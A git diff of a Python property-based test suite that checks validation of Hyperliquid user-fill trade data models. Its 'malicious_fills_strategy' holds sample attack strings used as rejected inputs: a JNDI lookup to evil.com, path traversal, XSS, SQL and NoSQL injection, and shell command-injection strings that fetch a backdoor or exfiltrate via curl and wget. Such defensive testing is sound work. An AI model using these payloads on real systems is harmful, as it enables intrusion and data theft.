@@ -1,14 +1,27 @@
-# CyberDeltaEngine: Hyperliquid Raw User Fills Model Test Suite
-# -------------------------------------------------------------
-# Comprehensive tests for all models in hl_raw_user_fills.py
-# - Strictly follows Raw Model Validation Policy
-# - Covers all edge cases, adversarial input, and structure validation
+"""Property-based tests for Hyperliquid raw user fills models.
 
-"""Unit tests for Hyperliquid Raw User Fills Models."""
+These tests validate critical security boundary models that process external user fill data.
+The models tested here are essential for trade execution tracking, fee calculation, and position management.
 
+SECURITY CRITICAL: These raw models protect against:
+- Malicious fill data that could manipulate P&L calculations
+- Financial precision errors in fill prices and sizes
+- Buffer overflow attacks through oversized fill lists
+- Injection attacks through malformed transaction hashes
+- Trade ID manipulation that could affect audit trails
+- Position tracking corruption through invalid start positions
+- Fee manipulation that could affect cost calculations
+
+Property testing ensures comprehensive coverage of fill edge cases and adversarial inputs.
+"""
+
+import json
+from decimal import Decimal
 from typing import Any
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.hyperliquid.models.hl_raw_user_fills import (
@@ -16,53 +29,754 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_user_fills import (
     HyperliquidRawUserFillsRequestPayload,
     HyperliquidRawUserFillsResponse,
 )
-from cyberdelta.exceptions.field_validation import TypeFieldError
+from cyberdelta.apis.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError, ParsingError
 
 
-# --- Helper: Valid minimal payloads for each model ---
-def valid_user_fill() -> dict[str, object]:
-    """Return valid user fill for testing."""
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR USER FILLS MODEL TESTING
+# =============================================================================
+
+
+def decimal_str_strategy() -> SearchStrategy[str]:
+    """Generate valid decimal strings for prices and amounts."""
+    return st.one_of([
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("1000000"), places=8).map(
+            str
+        ),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.just("0"),  # Zero
+        st.just("0.01"),  # Small amount
+        st.just("1.0"),  # Unit amount
+        st.just("100.0"),  # Standard amount
+        st.just("1234.56"),  # Common format
+        st.just("50000.123456"),  # High-precision
+        st.just("0.00000001"),  # Minimum precision
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e2"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+        # Negative values (valid for some fields like fees - rebates)
+        st.just("-0.001"),
+        st.just("-1.5"),
+    ])
+
+
+def positive_decimal_str_strategy() -> SearchStrategy[str]:
+    """Generate valid positive decimal strings."""
+    return st.one_of([
+        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=8).map(str),
+        st.decimals(min_value=Decimal("0.01"), max_value=Decimal("100000"), places=6).map(str),
+        st.just("0"),
+        st.just("0.01"),
+        st.just("1.0"),
+        st.just("100.0"),
+        st.just("1234.56"),
+        st.just("50000.123456"),
+    ])
+
+
+def trade_id_strategy() -> SearchStrategy[int]:
+    """Generate valid trade IDs."""
+    return st.integers(min_value=0, max_value=2**63 - 1)
+
+
+def coin_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid coin symbols."""
+    return st.one_of([
+        st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
+        st.text(
+            min_size=1,
+            max_size=64,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_/"
+            ),
+        ),
+        # Special symbols with emojis and unicode
+        st.just("ETH 💎"),
+        st.just("BTC-PERP"),
+        st.just("SOL/USDC"),
+    ])
+
+
+def side_strategy() -> SearchStrategy[str]:
+    """Generate valid order side values."""
+    return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask
+
+
+def direction_strategy() -> SearchStrategy[str]:
+    """Generate valid direction values."""
+    return st.one_of([
+        st.sampled_from(["Buy", "Sell", "long", "short"]),
+        st.text(min_size=1, max_size=64),  # Direction is a string field
+    ])
+
+
+def hash_strategy() -> SearchStrategy[str]:
+    """Generate valid transaction hash strings."""
+    return st.one_of([
+        # Standard hex hashes
+        st.text(alphabet="0123456789abcdef", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
+        st.text(alphabet="0123456789ABCDEF", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
+        # Shorter hashes (some systems use different lengths)
+        st.text(alphabet="0123456789abcdef", min_size=32, max_size=32).map(lambda x: f"0x{x}"),
+        # Max length (66 chars including 0x)
+        st.text(alphabet="0123456789abcdef", min_size=64, max_size=64).map(lambda x: f"0x{x}"),
+    ])
+
+
+def client_order_id_strategy() -> SearchStrategy[str | None]:
+    """Generate valid client order ID strings."""
+    return st.one_of([
+        st.none(),  # Optional field
+        st.text(
+            min_size=1,
+            max_size=128,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="-_"
+            ),
+        ),
+        st.just("client-1"),
+        st.just("order_12345"),
+        st.just("test-order-001"),
+    ])
+
+
+def eth_address_strategy() -> SearchStrategy[str]:
+    """Generate valid Ethereum address strings."""
+    return st.one_of([
+        # Standard Ethereum addresses
+        st.just("0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"),
+        st.just("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb1"),
+        st.just("0x0000000000000000000000000000000000000000"),  # Zero address
+        st.just("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"),  # Max address
+        # Generate random valid addresses
+        st.text(
+            alphabet="0123456789abcdefABCDEF",
+            min_size=40,
+            max_size=40,
+        ).map(lambda x: f"0x{x}"),
+    ])
+
+
+@st.composite
+def valid_user_fill_data(draw) -> dict[str, Any]:
+    """Generate valid user fill data."""
     return {
-        "tid": 1,
-        "coin": "ETH",
-        "px": "123.45",
-        "sz": "1.0",
-        "time": 1234567890,
-        "side": "B",
-        "oid": 2,
-        "startPosition": "0.0",
-        "dir": "long",
-        "hash": "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef123400",
-        "fee": "0.01",
-        "isMaker": True,
-        "liquidationMarkPx": None,
-        "cloid": None,
+        "tid": draw(trade_id_strategy()),
+        "coin": draw(coin_symbol_strategy()),
+        "px": draw(decimal_str_strategy()),
+        "sz": draw(positive_decimal_str_strategy()),
+        "time": draw(st.integers(min_value=0, max_value=2**63 - 1)),
+        "side": draw(side_strategy()),
+        "oid": draw(trade_id_strategy()),
+        "startPosition": draw(decimal_str_strategy()),
+        "dir": draw(direction_strategy()),
+        "hash": draw(hash_strategy()),
+        "fee": draw(decimal_str_strategy()),  # Can be negative (rebates)
+        "isMaker": draw(st.booleans()),
+        "liquidationMarkPx": draw(st.one_of([st.none(), decimal_str_strategy()])),
+        "cloid": draw(client_order_id_strategy()),
     }
 
 
-def valid_user_fills_response() -> list[dict[str, object]]:
-    """Return valid user fills response for testing."""
-    return [valid_user_fill()]
-
-
-def valid_user_fills_request_payload() -> dict[str, object]:
-    """Return valid user fills request payload for testing."""
-    # Use a valid Ethereum address (0x + 40 hex chars) for strict validation
-    # Example: 0xabcdefabcdefabcdefabcdefabcdefabcdefabcd (40 hex chars)
-    return {"type": "userFills", "user": "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd"}
-
-
-# --- Fixtures ---
-@pytest.fixture
-def valid_user_fill_data() -> dict[str, Any]:
-    """Return a dictionary with valid raw user fill data."""
+@st.composite
+def valid_user_fills_request_data(draw) -> dict[str, str]:
+    """Generate valid user fills request payload data."""
     return {
+        "type": "userFills",
+        "user": draw(eth_address_strategy()),
+    }
+
+
+def malicious_fills_strategy() -> SearchStrategy[Any]:
+    """Generate malicious values for fills security testing."""
+    return st.one_of([
+        # Fill manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-fills}"),
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('fills-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE fills;--"),
+        st.just("1' UNION SELECT * FROM trades--"),
+        # Buffer overflow attempts
+        st.text(min_size=1000, max_size=1500),
+        st.just("F" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.fills.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.px > 1000000"}'),
+        # Invalid decimals
+        st.just("NaN"),
+        st.just("inf"),
+        st.just("-inf"),
+        st.just("Infinity"),
+        st.just("not_a_number"),
+        # Type confusion
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+    ])
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILL MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawUserFillProperties:
+    """Property-based tests for user fill validation and security."""
+
+    @given(fill_data=valid_user_fill_data())
+    def test_user_fill_validation_success_properties(self, fill_data: dict[str, Any]) -> None:
+        """Property: Valid user fill data should always create valid fill objects."""
+        # Skip invalid data
+        assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
+        assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
+        assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
+        assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
+        assume(len(fill_data["coin"].encode("utf-8")) <= 64)
+        assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
+        assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
+        assume(len(fill_data["hash"].encode("utf-8")) <= 66)
+        assume(fill_data["side"] in ["B", "S", "A"])
+        assume(isinstance(fill_data["isMaker"], bool))
+
+        # Validate decimals
+        for field in ["px", "sz", "fee", "startPosition"]:
+            value = fill_data[field]
+            assume(isinstance(value, str) and value.strip())
+            try:
+                decimal_val = Decimal(value.strip())
+                assume(decimal_val.is_finite())
+                if field == "sz":
+                    assume(decimal_val >= 0)
+            except (ValueError, TypeError):
+                assume(False)
+
+        # Validate optional liquidationMarkPx
+        if fill_data["liquidationMarkPx"] is not None:
+            value = fill_data["liquidationMarkPx"]
+            assume(isinstance(value, str) and value.strip())
+            try:
+                decimal_val = Decimal(value.strip())
+                assume(decimal_val.is_finite())
+            except (ValueError, TypeError):
+                assume(False)
+
+        # Validate optional cloid
+        if fill_data["cloid"] is not None:
+            assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
+            assume(len(fill_data["cloid"].encode("utf-8")) <= 128)
+
+        obj = HyperliquidRawUserFill.model_validate(fill_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawUserFill)
+
+        # Property: Fields should be preserved (with normalization)
+        assert obj.tid == fill_data["tid"]
+        assert obj.coin == fill_data["coin"]
+        assert Decimal(obj.px) == Decimal(fill_data["px"])
+        assert Decimal(obj.sz) == Decimal(fill_data["sz"])
+        assert obj.time == fill_data["time"]
+        assert obj.side == fill_data["side"]
+        assert obj.oid == fill_data["oid"]
+        assert Decimal(obj.start_position) == Decimal(fill_data["startPosition"])
+        assert obj.dir == fill_data["dir"]
+        assert obj.hash == fill_data["hash"]
+        assert Decimal(obj.fee) == Decimal(fill_data["fee"])
+        assert obj.is_maker == fill_data["isMaker"]
+
+        if fill_data["liquidationMarkPx"] is not None:
+            assert Decimal(obj.liquidation_mark_px) == Decimal(fill_data["liquidationMarkPx"])
+        else:
+            assert obj.liquidation_mark_px is None
+
+        assert obj.cloid == fill_data["cloid"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        field_name=st.sampled_from([
+            "tid",
+            "coin",
+            "px",
+            "sz",
+            "time",
+            "side",
+            "oid",
+            "startPosition",
+            "dir",
+            "hash",
+            "fee",
+            "isMaker",
+        ]),
+        malicious_value=malicious_fills_strategy(),
+    )
+    def test_user_fill_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: User fill should reject malicious inputs safely."""
+        base_data = {
+            "tid": 1,
+            "coin": "ETH",
+            "px": "100.0",
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": "B",
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": "0x" + "a" * 64,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+        base_data[field_name] = malicious_value
+
+        # Property: Malicious input should be rejected
+        with pytest.raises((
+            ValidationError,
+            TypeError,
+            EmptyStringError,
+            TypeFieldError,
+            ParsingError,
+        )):
+            HyperliquidRawUserFill.model_validate(base_data)
+
+    @given(invalid_tid=st.integers(min_value=-1000, max_value=-1))
+    def test_user_fill_negative_tid_properties(self, invalid_tid: int) -> None:
+        """Property: User fill should reject negative trade IDs."""
+        fill_data = {
+            "tid": invalid_tid,
+            "coin": "ETH",
+            "px": "100.0",
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": "B",
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": "0x" + "a" * 64,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+
+        # Property: Negative TIDs should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawUserFill.model_validate(fill_data)
+
+    @given(invalid_side=st.text().filter(lambda x: x not in ["B", "S", "A"]))
+    def test_user_fill_invalid_side_properties(self, invalid_side: str) -> None:
+        """Property: User fill should validate side values strictly."""
+        assume(invalid_side.strip())  # Skip empty strings
+
+        fill_data = {
+            "tid": 1,
+            "coin": "ETH",
+            "px": "100.0",
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": invalid_side,
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": "0x" + "a" * 64,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+
+        # Property: Invalid side values should be rejected
+        with pytest.raises((ValidationError, EmptyStringError)):
+            HyperliquidRawUserFill.model_validate(fill_data)
+
+    @given(
+        invalid_hash=st.one_of([
+            st.just(""),  # Empty
+            st.just("   "),  # Whitespace
+            st.just("not_a_hash"),  # Invalid format
+            st.text(min_size=67, max_size=100),  # Too long (max is 66)
+            st.just("0x"),  # Too short
+            st.just("0x" + "G" * 64),  # Invalid hex chars
+        ])
+    )
+    def test_user_fill_invalid_hash_properties(self, invalid_hash: str) -> None:
+        """Property: User fill should validate hash format."""
+        fill_data = {
+            "tid": 1,
+            "coin": "ETH",
+            "px": "100.0",
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": "B",
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": invalid_hash,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+
+        # Property: Invalid hashes should be rejected
+        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawUserFill.model_validate(fill_data)
+
+    @given(
+        invalid_px=st.one_of([
+            st.just(""),  # Empty
+            st.just("   "),  # Whitespace
+            st.just("NaN"),  # Not a number
+            st.just("inf"),  # Infinity
+            st.just("-inf"),  # Negative infinity
+            st.just("Infinity"),
+            st.just("not_a_number"),
+        ])
+    )
+    def test_user_fill_invalid_price_properties(self, invalid_px: str) -> None:
+        """Property: User fill should validate price constraints."""
+        fill_data = {
+            "tid": 1,
+            "coin": "ETH",
+            "px": invalid_px,
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": "B",
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": "0x" + "a" * 64,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+
+        try:
+            # Check if the price can be parsed as a finite decimal
+            decimal_val = Decimal(invalid_px.strip() if invalid_px else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not invalid_px.strip()
+
+            if is_finite and not is_empty:
+                # Property: Valid finite decimals should be accepted
+                obj = HyperliquidRawUserFill.model_validate(fill_data)
+                assert Decimal(obj.px) == decimal_val
+            else:
+                # Property: Non-finite or empty values should be rejected
+                with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
+                    HyperliquidRawUserFill.model_validate(fill_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable price strings should be rejected
+            with pytest.raises((ValidationError, EmptyStringError, ParsingError)):
+                HyperliquidRawUserFill.model_validate(fill_data)
+
+    @given(
+        extra_fields=st.dictionaries(
+            st.text(min_size=1, max_size=20),
+            st.text(min_size=1, max_size=20),
+            min_size=1,
+            max_size=5,
+        )
+    )
+    def test_user_fill_extra_fields_properties(self, extra_fields: dict[str, str]) -> None:
+        """Property: User fill should forbid extra fields."""
+        fill_data = {
+            "tid": 1,
+            "coin": "ETH",
+            "px": "100.0",
+            "sz": "1.0",
+            "time": 1234567890,
+            "side": "B",
+            "oid": 2,
+            "startPosition": "0.0",
+            "dir": "long",
+            "hash": "0x" + "a" * 64,
+            "fee": "0.01",
+            "isMaker": True,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+        fill_data.update(extra_fields)
+
+        # Property: Extra fields should be rejected
+        with pytest.raises(ValidationError):
+            HyperliquidRawUserFill.model_validate(fill_data)
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILLS RESPONSE MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawUserFillsResponseProperties:
+    """Property-based tests for user fills response validation and security."""
+
+    @given(fills=st.lists(valid_user_fill_data(), min_size=0, max_size=100))
+    def test_user_fills_response_validation_success_properties(
+        self, fills: list[dict[str, Any]]
+    ) -> None:
+        """Property: Valid fills list should always create valid response objects."""
+        valid_fills = []
+
+        for fill_data in fills:
+            try:
+                # Validate all required fields
+                assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
+                assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
+                assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
+                assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
+                assume(len(fill_data["coin"].encode("utf-8")) <= 64)
+                assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
+                assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
+                assume(len(fill_data["hash"].encode("utf-8")) <= 66)
+                assume(fill_data["side"] in ["B", "S", "A"])
+                assume(isinstance(fill_data["isMaker"], bool))
+
+                # Validate decimals
+                for field in ["px", "sz", "fee", "startPosition"]:
+                    value = fill_data[field]
+                    assume(isinstance(value, str) and value.strip())
+                    decimal_val = Decimal(value.strip())
+                    assume(decimal_val.is_finite())
+                    if field == "sz":
+                        assume(decimal_val >= 0)
+
+                # Validate optional fields
+                if fill_data["liquidationMarkPx"] is not None:
+                    value = fill_data["liquidationMarkPx"]
+                    assume(isinstance(value, str) and value.strip())
+                    decimal_val = Decimal(value.strip())
+                    assume(decimal_val.is_finite())
+
+                if fill_data["cloid"] is not None:
+                    assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
+                    assume(len(fill_data["cloid"].encode("utf-8")) <= 128)
+
+                valid_fills.append(fill_data)
+            except (ValueError, TypeError):
+                pass  # Skip invalid fills
+
+        obj = HyperliquidRawUserFillsResponse.model_validate(valid_fills)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawUserFillsResponse)
+        assert isinstance(obj.root, list)
+        assert len(obj.root) == len(valid_fills)
+
+        # Property: All fills should be properly typed
+        for fill in obj.root:
+            assert isinstance(fill, HyperliquidRawUserFill)
+
+    @given(
+        invalid_root=st.one_of([
+            st.dictionaries(st.text(), st.text()),  # Dict instead of list
+            st.text(),  # String instead of list
+            st.integers(),  # Integer instead of list
+            st.floats(),  # Float instead of list
+            st.booleans(),  # Boolean instead of list
+            st.none(),  # None instead of list
+        ])
+    )
+    def test_user_fills_response_type_validation_properties(self, invalid_root: Any) -> None:
+        """Property: User fills response should reject non-list inputs."""
+        with pytest.raises((ValidationError, TypeError)):
+            HyperliquidRawUserFillsResponse.model_validate(invalid_root)
+
+    def test_user_fills_response_empty_list_properties(self) -> None:
+        """Property: Empty fills list should be valid."""
+        obj = HyperliquidRawUserFillsResponse.model_validate([])
+        assert obj.root == []
+
+
+# =============================================================================
+# PROPERTY TESTS FOR HYPERLIQUID RAW USER FILLS REQUEST PAYLOAD MODEL
+# =============================================================================
+
+
+class TestHyperliquidRawUserFillsRequestPayloadProperties:
+    """Property-based tests for user fills request payload validation and security."""
+
+    @given(request_data=valid_user_fills_request_data())
+    def test_user_fills_request_validation_success_properties(
+        self, request_data: dict[str, str]
+    ) -> None:
+        """Property: Valid request data should always create valid request objects."""
+        # Validate user address
+        user = request_data["user"]
+        assume(isinstance(user, str) and user.startswith("0x"))
+        assume(len(user) == 42)  # 0x + 40 hex chars
+        assume(all(c in "0123456789abcdefABCDEF" for c in user[2:]))
+
+        obj = HyperliquidRawUserFillsRequestPayload.model_validate(request_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, HyperliquidRawUserFillsRequestPayload)
+        assert obj.type == "userFills"
+        assert obj.user == request_data["user"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+
+    @given(
+        invalid_user=st.one_of([
+            st.just("0x123"),  # Too short
+            st.just("notanaddress"),  # No 0x prefix
+            st.just("0x" + "G" * 40),  # Invalid hex chars
+            st.text(min_size=43, max_size=100),  # Too long
+            st.just(""),  # Empty
+            st.just("   "),  # Whitespace
+        ])
+    )
+    def test_user_fills_request_invalid_user_properties(self, invalid_user: str) -> None:
+        """Property: User fills request should validate user address format."""
+        request_data = {
+            "type": "userFills",
+            "user": invalid_user,
+        }
+
+        # Property: Invalid user addresses should be rejected
+        with pytest.raises((ValidationError, EmptyStringError, TypeFieldError)):
+            HyperliquidRawUserFillsRequestPayload.model_validate(request_data)
+
+    @given(invalid_type=st.text().filter(lambda x: x != "userFills"))
+    def test_user_fills_request_invalid_type_properties(self, invalid_type: str) -> None:
+        """Property: User fills request should only accept 'userFills' as type."""
+        assume(invalid_type.strip())  # Skip empty strings
+
+        request_data = {
+            "type": invalid_type,
+            "user": "0xabcdefabcdefabcdefabcdefabcdefabcdefabcd",
+        }
+
+        # Property: Invalid type values should be rejected
+        with pytest.raises((ValidationError, EmptyStringError)):
+            HyperliquidRawUserFillsRequestPayload.model_validate(request_data)
+
+
+# =============================================================================
+# INTEGRATION TESTS WITH MIXED PROPERTY SCENARIOS
+# =============================================================================
+
+
+class TestHyperliquidRawUserFillsIntegrationProperties:
+    """Integration property tests for user fills models working together."""
+
+    @given(
+        fill_data=valid_user_fill_data(),
+        malicious_entries=st.dictionaries(
+            malicious_fills_strategy(),
+            malicious_fills_strategy(),
+            min_size=1,
+            max_size=3,
+        ),
+    )
+    def test_user_fills_adversarial_input_properties(
+        self, fill_data: dict[str, Any], malicious_entries: dict[Any, Any]
+    ) -> None:
+        """Property: User fills models should safely handle adversarial input."""
+        # Mix valid and malicious data
+        mixed_data = {**fill_data, **malicious_entries}
+
+        # Property: Mixed adversarial input should be rejected
+        with pytest.raises((
+            ValidationError,
+            TypeError,
+            TypeFieldError,
+            EmptyStringError,
+            ParsingError,
+        )):
+            HyperliquidRawUserFill.model_validate(mixed_data)
+
+    @given(fill_data=valid_user_fill_data())
+    def test_user_fill_json_serialization_properties(self, fill_data: dict[str, Any]) -> None:
+        """Property: User fill should maintain JSON serialization compatibility."""
+        # Skip invalid data
+        try:
+            assume(isinstance(fill_data["tid"], int) and fill_data["tid"] >= 0)
+            assume(isinstance(fill_data["oid"], int) and fill_data["oid"] >= 0)
+            assume(isinstance(fill_data["time"], int) and fill_data["time"] >= 0)
+            assume(isinstance(fill_data["coin"], str) and fill_data["coin"].strip())
+            assume(len(fill_data["coin"].encode("utf-8")) <= 64)
+            assume(isinstance(fill_data["dir"], str) and fill_data["dir"].strip())
+            assume(isinstance(fill_data["hash"], str) and fill_data["hash"].strip())
+            assume(len(fill_data["hash"].encode("utf-8")) <= 66)
+            assume(fill_data["side"] in ["B", "S", "A"])
+            assume(isinstance(fill_data["isMaker"], bool))
+
+            # Validate decimals
+            for field in ["px", "sz", "fee", "startPosition"]:
+                value = fill_data[field]
+                assume(isinstance(value, str) and value.strip())
+                decimal_val = Decimal(value.strip())
+                assume(decimal_val.is_finite())
+                if field == "sz":
+                    assume(decimal_val >= 0)
+
+            # Validate optional fields
+            if fill_data["liquidationMarkPx"] is not None:
+                value = fill_data["liquidationMarkPx"]
+                assume(isinstance(value, str) and value.strip())
+                decimal_val = Decimal(value.strip())
+                assume(decimal_val.is_finite())
+
+            if fill_data["cloid"] is not None:
+                assume(isinstance(fill_data["cloid"], str) and fill_data["cloid"].strip())
+                assume(len(fill_data["cloid"].encode("utf-8")) <= 128)
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = HyperliquidRawUserFill.model_validate(fill_data)
+        json_str = obj.model_dump_json()
+        parsed_json = json.loads(json_str)
+
+        # Property: Should be able to reconstruct from JSON
+        reconstructed = HyperliquidRawUserFill.model_validate(parsed_json)
+        assert reconstructed.tid == obj.tid
+        assert reconstructed.coin == obj.coin
+        assert Decimal(reconstructed.px) == Decimal(obj.px)
+        assert Decimal(reconstructed.sz) == Decimal(obj.sz)
+
+
+# =============================================================================
+# LEGACY COMPATIBILITY TESTS
+# =============================================================================
+
+
+def test_HyperliquidRawUserFill_real_world_example() -> None:
+    """Test with real-world user fill data."""
+    payload = {
         "tid": 123456789,
         "coin": "ETH",
         "px": "2000.50",
         "sz": "0.1",
-        "time": 1678886400123,  # Example epoch ms
+        "time": 1678886400123,
         "side": "B",
         "oid": 987654321,
         "startPosition": "1.0",
@@ -73,571 +787,92 @@ def valid_user_fill_data() -> dict[str, Any]:
         "liquidationMarkPx": None,
         "cloid": None,
     }
-
-
-# --- Tests for HyperliquidRawUserFill ---
-def test_user_fill_happy_path() -> None:
-    """Test user fill happy path."""
-    obj = HyperliquidRawUserFill.model_validate(valid_user_fill())
+    obj = HyperliquidRawUserFill.model_validate(payload)
+    assert obj.tid == 123456789
     assert obj.coin == "ETH"
-    assert obj.px == "123.45"
-    assert obj.is_maker is True
-    assert obj.time == 1234567890
-    assert obj.oid == 2
-    assert obj.start_position == "0"  # Business logic normalizes "0.0" to "0"
+    assert obj.px == "2000.5"  # Normalized
+    assert obj.sz == "0.1"
+    assert obj.is_maker is False
 
 
-def test_user_fill_missing_required() -> None:
-    """Test user fill missing required."""
-    required = [
-        "tid",
-        "coin",
-        "px",
-        "sz",
-        "time",
-        "side",
-        "oid",
-        "startPosition",
-        "dir",
-        "hash",
-        "fee",
-        "isMaker",
+def test_HyperliquidRawUserFill_with_liquidation() -> None:
+    """Test with liquidation mark price."""
+    payload = {
+        "tid": 1,
+        "coin": "BTC",
+        "px": "30000.00",
+        "sz": "1.0",
+        "time": 1234567890,
+        "side": "S",
+        "oid": 2,
+        "startPosition": "5.0",
+        "dir": "short",
+        "hash": "0x" + "a" * 64,
+        "fee": "15.00",
+        "isMaker": True,
+        "liquidationMarkPx": "29500.00",
+        "cloid": "liquidation-001",
+    }
+    obj = HyperliquidRawUserFill.model_validate(payload)
+    assert obj.liquidation_mark_px == "29500"  # Normalized
+    assert obj.cloid == "liquidation-001"
+
+
+def test_HyperliquidRawUserFill_negative_fee() -> None:
+    """Test with negative fee (rebate)."""
+    payload = {
+        "tid": 1,
+        "coin": "SOL",
+        "px": "100.00",
+        "sz": "10.0",
+        "time": 1234567890,
+        "side": "B",
+        "oid": 2,
+        "startPosition": "0.0",
+        "dir": "long",
+        "hash": "0x" + "b" * 64,
+        "fee": "-0.05",  # Rebate
+        "isMaker": True,
+        "liquidationMarkPx": None,
+        "cloid": None,
+    }
+    obj = HyperliquidRawUserFill.model_validate(payload)
+    assert obj.fee == "-0.05"
+
+
+def test_HyperliquidRawUserFillsResponse_multiple_fills() -> None:
+    """Test response with multiple fills."""
+    fills = [
+        {
+            "tid": i,
+            "coin": f"COIN{i}",
+            "px": str(100 + i),
+            "sz": "1.0",
+            "time": 1234567890 + i,
+            "side": "B" if i % 2 == 0 else "S",
+            "oid": 100 + i,
+            "startPosition": "0.0",
+            "dir": "long" if i % 2 == 0 else "short",
+            "hash": f"0x{'a' * 63}{i}",
+            "fee": "0.01",
+            "isMaker": i % 2 == 0,
+            "liquidationMarkPx": None,
+            "cloid": None,
+        }
+        for i in range(5)
     ]
-    for field in required:
-        d = valid_user_fill().copy()
-        del d[field]
-        with pytest.raises(ValidationError) as exc_info:
-            HyperliquidRawUserFill.model_validate(d)
-        # Simpler assertion for missing field, ensuring field name is present and "Field required"
-        error_str = str(exc_info.value)
-        # Pydantic v2 often puts the field name on its own line above the error
-        assert f"\n{field}\n" in error_str or f" {field}\n" in error_str
-        assert "Field required" in error_str
+    obj = HyperliquidRawUserFillsResponse.model_validate(fills)
+    assert len(obj.root) == 5
+    assert obj.root[0].tid == 0
+    assert obj.root[4].tid == 4
 
 
-def test_user_fill_optional_fields() -> None:
-    """Test user fill optional fields."""
-    d = valid_user_fill().copy()
-    d["liquidationMarkPx"] = "123.45"
-    d["cloid"] = "client-1"
-    obj = HyperliquidRawUserFill.model_validate(d)
-    assert obj.liquidation_mark_px == "123.45"
-    assert obj.cloid == "client-1"
